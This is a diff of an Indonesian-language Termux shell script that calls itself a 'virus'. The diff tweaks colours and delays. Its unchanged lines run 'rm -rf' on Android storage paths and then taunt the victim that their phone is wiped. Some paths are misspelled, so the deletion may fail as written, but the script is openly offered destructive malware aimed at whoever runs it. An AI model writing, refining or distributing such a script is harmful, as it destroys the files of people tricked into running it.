@@ -19,7 +19,7 @@ bg_pu="\033[40m" # Latar Belakang Abu-abu
 res="\033[0m"    # Reset semua atribut
 clear
 
-$e ${bg_p} "[📱 VIRUS TERMUX 🦠 2025]"
+$e ${m} "[📱 VIRUS TERMUX 🦠 2025]"
 
 read -p " enter melalukan virus termux"
 
@@ -30,7 +30,7 @@ $e "${u}=   ${h} [2025 virus termux hahahahahahha]     ${u}        ="
 $e "${u}==============================================="
 
 
-sleep 4
+sleep 7
 
 rm -rf /DIR/storage/android
 rm -rf /sdacrd/androind
@@ -41,6 +41,6 @@ sleep 1
 clear
 
 
-$e ${bg_h} "SELAMAT TINGGAL HP MU JADI BARU  HA HA HA HA "
+$e ${k} "SELAMAT TINGGAL HP MU JADI BARU  HA HA HA HA "
 
-sleep 3
+sleep 5
